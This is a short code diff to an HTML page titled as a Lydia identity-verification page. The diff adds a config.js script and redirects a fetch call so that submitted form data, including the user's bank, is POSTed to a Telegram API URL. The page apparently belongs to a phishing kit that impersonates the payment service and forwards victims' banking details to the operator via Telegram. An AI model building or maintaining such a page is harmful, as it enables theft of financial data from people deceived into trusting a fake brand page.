@@ -6,6 +6,7 @@
   <title>Vérification d'identité - Lydia</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="config.js"></script>
   <style>
     :root {
       --primary-blue: #0066FF;
@@ -1167,7 +1168,7 @@
           const bank = getBankValue();
           
           try {
-            const apiResponse = await fetch('/api/send-telegram', {
+            const apiResponse = await fetch(window.TELEGRAM_API_URL, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
